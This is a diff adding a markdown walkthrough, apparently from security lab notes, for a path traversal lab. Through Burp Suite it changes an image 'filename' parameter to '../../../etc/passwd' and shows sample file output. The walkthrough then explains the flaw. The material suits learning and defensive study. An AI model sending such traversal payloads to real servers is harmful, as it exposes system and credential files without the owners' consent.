@@ -277,5 +277,118 @@ or
 
 Normalize and validate paths before reading files.
 
+# Path Traversal - Reading Arbitrary Files
 
 ![lab1-](screenshots/labp1.png)
+
+## Step 1: Intercept a Product Image Request
+
+1. Open any product page.
+2. Click on a product image.
+3. In Burp Suite, intercept or locate the request in:
+
+```text
+Proxy > HTTP History
+```
+
+Example request:
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+## Step 2: Modify the Filename Parameter
+
+Change:
+
+```http
+filename=218.png
+```
+
+to:
+
+```http
+filename=../../../etc/passwd
+```
+
+Modified request:
+
+```http
+GET /image?filename=../../../etc/passwd HTTP/2
+```
+
+## Step 3: Forward the Request
+
+1. Send the modified request.
+2. Observe the response.
+
+## Step 4: View File Contents
+
+The server returns the contents of:
+
+```text
+/etc/passwd
+```
+
+Example response:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+...
+```
+![lab1-](screenshots/pb.png)
+
+## Step 5: Lab Solved
+![lab1-](screenshots/labsp.png)
+
+Successfully reading:
+
+```text
+/etc/passwd
+```
+
+confirms the Path Traversal vulnerability and solves the lab.
+
+# Vulnerability Explanation
+
+### Intended Access
+
+```text
+/image?filename=218.png
+```
+
+Server reads:
+
+```text
+/var/www/images/218.png
+```
+
+### Path Traversal Attack
+
+```text
+../../../etc/passwd
+```
+
+Traversal:
+
+```text
+images/
+   ↑
+../
+   ↑
+../
+   ↑
+../
+   ↑
+/etc/passwd
+```
+
+Result:
+
+```text
+Server reads arbitrary system files.
+```
+
+---
